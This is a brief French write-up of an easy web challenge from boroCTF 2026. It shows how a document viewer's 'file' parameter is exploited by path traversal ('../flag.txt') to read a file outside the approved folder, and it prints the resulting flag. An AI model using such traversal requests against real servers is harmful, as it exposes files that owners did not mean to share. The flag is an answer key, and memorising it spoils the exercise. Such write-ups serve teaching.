# dotdotslashflagtxt

> **CTF** : boroCTF 2026  
> **Catégorie** : `web` · **Points** : 100 · **Solves** : 42  
> **Difficulté** : easy  
> **Auteur** : Solarity

---

## 📝 Description

### Texte originial

> A company left their internal document viewer exposed. It only shows approved files... or does it?

### Traduction

> Une entreprise a laissé son système de visualisation de documents interne accessible à tous. Celui-ci n'affiche que les fichiers approuvés… ou peut-être pas ?

**Accès** : `https://0gil6sh8nlk1.boroctf.com/`

---
 
## Résolution
 
On peut voir que si on clique sur un fichier on arrive sur cette URL :

```
https://0gil6sh8nlk1.boroctf.com/view?file=about.txt
```

Et on sait qu'il y a un fichier `flag.txt` mais il n'est pas dans le même dossier donc on va essayer d'acceder au fichier `../flag.txt` avec cette URL : 

```
https://0gil6sh8nlk1.boroctf.com/view?file=../flag.txt
```

Un fichier s'affiche avec le flag
 
---
 
## Flag
 
```
boroCTF{p@th_Tr@v3rs@L_r0Ck5!}
```